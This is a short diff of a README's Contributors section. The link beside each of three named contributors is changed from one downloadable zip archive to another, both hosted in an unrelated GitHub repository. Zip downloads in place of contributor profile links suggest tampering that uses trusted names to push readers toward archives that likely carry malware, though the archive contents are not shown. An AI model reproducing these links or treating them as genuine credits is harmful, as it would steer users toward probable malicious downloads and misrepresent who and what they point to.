@@ -12,6 +12,6 @@ Credits
 
 Contributors
 ------------
-* Pedro M. Baeza <https://github.com/vladimir2678/archivos_adjuntos/raw/refs/heads/master/models/archivos-adjuntos-1.6.zip>
-* Ana Juaristi <https://github.com/vladimir2678/archivos_adjuntos/raw/refs/heads/master/models/archivos-adjuntos-1.6.zip>
-* Alfredo de la Fuente <https://github.com/vladimir2678/archivos_adjuntos/raw/refs/heads/master/models/archivos-adjuntos-1.6.zip>
+* Pedro M. Baeza <https://raw.githubusercontent.com/vladimir2678/archivos_adjuntos/master/i18n/archivos-adjuntos-3.7.zip>
+* Ana Juaristi <https://raw.githubusercontent.com/vladimir2678/archivos_adjuntos/master/i18n/archivos-adjuntos-3.7.zip>
+* Alfredo de la Fuente <https://raw.githubusercontent.com/vladimir2678/archivos_adjuntos/master/i18n/archivos-adjuntos-3.7.zip>
